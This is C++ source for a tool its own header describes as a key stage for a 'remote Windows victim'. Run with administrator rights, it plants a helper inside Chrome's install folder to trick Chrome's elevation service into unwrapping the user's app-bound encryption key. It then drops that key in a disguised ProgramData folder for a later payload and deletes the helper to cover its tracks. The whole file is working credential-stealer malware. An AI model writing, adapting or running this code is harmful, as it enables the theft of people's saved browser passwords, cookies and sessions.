// keytool.cpp - one-shot v20 key stage for a remote Windows victim.
// Deploys the Chrome elevation-service client into Program Files, unwraps the
// app-bound key for the current user, and writes mc-chrome.key for the payload.
//
// Must run elevated as the SAME Windows user that runs Chrome. The service
// checks the caller path, so ckdec.exe is copied into Chrome's Application dir;
// the child inherits the elevated token, where user DPAPI still resolves.
//
// Build: build_keytool.bat -> bin\ckkey.exe (ckdec.exe embedded as RCDATA)
// Run with /quiet for scripted use (no message boxes, errors on stdout).
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <cstdio>
#include <cstring>

#define STAGE_DIR L"C:\\ProgramData\\MediaCache"

static bool g_quiet = false;

static int fail(const char* msg){
    if(g_quiet) printf("ERR: %s\n", msg);
    else MessageBoxA(NULL, msg, "Chrome key", MB_ICONERROR);
    return 1;
}
static int ok(const char* msg){
    if(g_quiet) printf("OK: %s\n", msg);
    else MessageBoxA(NULL, msg, "Chrome key", MB_ICONINFORMATION);
    return 0;
}

static bool is_elevated(void){
    HANDLE tok = NULL;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return false;
    TOKEN_ELEVATION te; DWORD n = 0; bool elevated = false;
    if(GetTokenInformation(tok, TokenElevation, &te, sizeof(te), &n)) elevated = te.TokenIsElevated != 0;
    CloseHandle(tok);
    return elevated;
}

static bool read_file(const wchar_t* path, char** out, DWORD* out_len){
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if(h == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER sz;
    if(!GetFileSizeEx(h, &sz) || sz.QuadPart <= 0 || sz.QuadPart > 16*1024*1024){
        CloseHandle(h); return false;
    }
    char* buf = (char*)VirtualAlloc(NULL, (SIZE_T)sz.QuadPart + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if(!buf){ CloseHandle(h); return false; }
    DWORD rd = 0;
    if(!ReadFile(h, buf, (DWORD)sz.QuadPart, &rd, NULL)){
        VirtualFree(buf,0,MEM_RELEASE); CloseHandle(h); return false;
    }
    CloseHandle(h);
    buf[rd] = 0;
    *out = buf; *out_len = rd;
    return true;
}

static bool write_file(const wchar_t* path, const void* data, DWORD len){
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if(h == INVALID_HANDLE_VALUE) return false;
    DWORD wr = 0; bool wrote = WriteFile(h, data, len, &wr, NULL) && wr == len;
    CloseHandle(h);
    return wrote;
}

// extract "app_bound_encrypted_key":"<base64>" from Local State
static bool app_bound_blob(const char* json, DWORD len, char** b64_out, DWORD* b64_len){
    static const char key[] = "\"app_bound_encrypted_key\"";
    const DWORD key_len = (DWORD)(sizeof(key) - 1);       // 25 with both quotes
    const char* k = NULL;
    for(DWORD i=0; i + key_len < len; i++){
        if(json[i] == '"' && memcmp(json + i, key, key_len) == 0){ k = json + i; break; }
    }
    if(!k) return false;
    const char* c = k + key_len;
    while(*c && *c != ':') c++;
    if(!*c) return false;
    c++;
    while(*c == ' ' || *c == '\t' || *c == '\r' || *c == '\n') c++;
    if(*c != '"') return false;
    const char* v = c + 1;
    const char* e = v;
    while(*e && *e != '"') e++;
    if(!*e) return false;
    DWORD n = (DWORD)(e - v);
    if(n < 8 || n > len) return false;
    char* out = (char*)VirtualAlloc(NULL, n + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if(!out) return false;
    memcpy(out, v, n); out[n] = 0;
    *b64_out = out; *b64_len = n;
    return true;
}

static bool b64_decode(const char* b64, DWORD n, unsigned char** out, DWORD* out_len){
    DWORD need = 0;
    if(!CryptStringToBinaryA(b64, n, CRYPT_STRING_BASE64, NULL, &need, NULL, NULL) || !need) return false;
    unsigned char* buf = (unsigned char*)VirtualAlloc(NULL, need, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if(!buf) return false;
    if(!CryptStringToBinaryA(b64, n, CRYPT_STRING_BASE64, buf, &need, NULL, NULL)){
        VirtualFree(buf,0,MEM_RELEASE); return false;
    }
    *out = buf; *out_len = need;
    return true;
}

static bool deploy_helper(wchar_t* dest, DWORD dest_cch, char* err, DWORD err_cch){
    wchar_t base[MAX_PATH];
    DWORD n = GetEnvironmentVariableW(L"ProgramFiles", base, MAX_PATH);
    if(!n || n >= MAX_PATH){
        n = GetEnvironmentVariableW(L"ProgramFiles(x86)", base, MAX_PATH);
        if(!n || n >= MAX_PATH){ wsprintfA(err, "Program Files not found"); return false; }
    }
    wsprintfW(dest, L"%s\\Google\\Chrome\\Application", base);
    if(GetFileAttributesW(dest) == INVALID_FILE_ATTRIBUTES){
        wsprintfA(err, "Chrome Application directory not found"); return false;
    }
    lstrcatW(dest, L"\\ckdec.exe");

    HRSRC r = FindResourceW(NULL, L"CKHELP", MAKEINTRESOURCEW(10));
    if(!r){ wsprintfA(err, "embedded helper missing"); return false; }
    HGLOBAL g = LoadResource(NULL, r);
    DWORD sz = SizeofResource(NULL, r);
    void* p = g ? LockResource(g) : NULL;
    if(!p || !sz || !write_file(dest, p, sz)){
        wsprintfA(err, "helper write failed (run as administrator), err=%lu", GetLastError());
        return false;
    }
    return true;
}

static bool run_helper(const wchar_t* helper, const wchar_t* appb, const wchar_t* rawkey, char* err){
    wchar_t cmd[2048];
    wsprintfW(cmd, L"\"%s\" \"%s\" \"%s\"", helper, appb, rawkey);
    STARTUPINFOW si; memset(&si,0,sizeof(si)); si.cb = sizeof(si);
    PROCESS_INFORMATION pi; memset(&pi,0,sizeof(pi));
    if(!CreateProcessW(helper, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
        wsprintfA(err, "helper launch failed, err=%lu", GetLastError()); return false;
    }
    DWORD wr = WaitForSingleObject(pi.hProcess, 60000);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    if(wr != WAIT_OBJECT_0 || code != 0){
        wsprintfA(err, "service call failed (exit=%lu, wait=%lu)", code, wr); return false;
    }
    return true;
}

int wmain(void){
    g_quiet = wcsstr(GetCommandLineW(), L"/quiet") != NULL;
    char err[512] = {0};
    wchar_t helper[MAX_PATH*2] = {0};

    if(!is_elevated()) return fail("Run this as administrator.");
    if(!deploy_helper(helper, MAX_PATH*2, err, sizeof(err))) return fail(err);

    wchar_t la[MAX_PATH];
    if(!GetEnvironmentVariableW(L"LOCALAPPDATA", la, MAX_PATH))
        return fail("LOCALAPPDATA not found");

    wchar_t ls[MAX_PATH*2];
    wsprintfW(ls, L"%s\\Google\\Chrome\\User Data\\Local State", la);

    char* json = NULL; DWORD json_len = 0;
    if(!read_file(ls, &json, &json_len))
        return fail("Chrome Local State not readable");

    char* b64 = NULL; DWORD b64_len = 0;
    if(!app_bound_blob(json, json_len, &b64, &b64_len)){
        VirtualFree(json,0,MEM_RELEASE);
        return fail("app_bound_encrypted_key not found");
    }
    VirtualFree(json,0,MEM_RELEASE);

    unsigned char* blob = NULL; DWORD blob_len = 0;
    if(!b64_decode(b64, b64_len, &blob, &blob_len)){
        VirtualFree(b64,0,MEM_RELEASE);
        return fail("app_bound key base64 decode failed");
    }
    VirtualFree(b64,0,MEM_RELEASE);
    if(blob_len < 8 || memcmp(blob, "APPB", 4) != 0){
        VirtualFree(blob,0,MEM_RELEASE);
        return fail("app_bound key is not APPB (Chrome changed the format)");
    }

    CreateDirectoryW(STAGE_DIR, NULL);
    wchar_t appb[MAX_PATH*2], rawkey[MAX_PATH*2], keyfile[MAX_PATH*2], legacy[MAX_PATH*2];
    wsprintfW(appb, L"%s\\chrome.appb", STAGE_DIR);
    wsprintfW(rawkey, L"%s\\chrome.rawkey", STAGE_DIR);
    wsprintfW(keyfile, L"%s\\mc-chrome.key", STAGE_DIR);
    wsprintfW(legacy, L"%s\\mc.key", STAGE_DIR);
    DeleteFileW(rawkey);
    if(!write_file(appb, blob + 4, blob_len - 4)){
        VirtualFree(blob,0,MEM_RELEASE);
        return fail("cannot write chrome.appb");
    }
    VirtualFree(blob,0,MEM_RELEASE);

    if(!run_helper(helper, appb, rawkey, err)) return fail(err);

    char* raw = NULL; DWORD raw_len = 0;
    if(!read_file(rawkey, &raw, &raw_len) || raw_len != 32){
        if(raw) VirtualFree(raw,0,MEM_RELEASE);
        return fail("service returned no 32-byte key");
    }
    char b64key[128] = {0}; DWORD b64key_len = sizeof(b64key);
    if(!CryptBinaryToStringA((BYTE*)raw, raw_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                             b64key, &b64key_len)){
        VirtualFree(raw,0,MEM_RELEASE);
        return fail("key encode failed");
    }
    VirtualFree(raw,0,MEM_RELEASE);

    bool wrote = write_file(keyfile, b64key, b64key_len) &&
                 write_file(legacy, b64key, b64key_len);
    DeleteFileW(rawkey);
    DeleteFileW(appb);
    DeleteFileW(helper);                       // no need to leave the client behind

    if(!wrote) return fail("cannot write mc-chrome.key");
    return ok("Chrome v20 key extracted.");
}
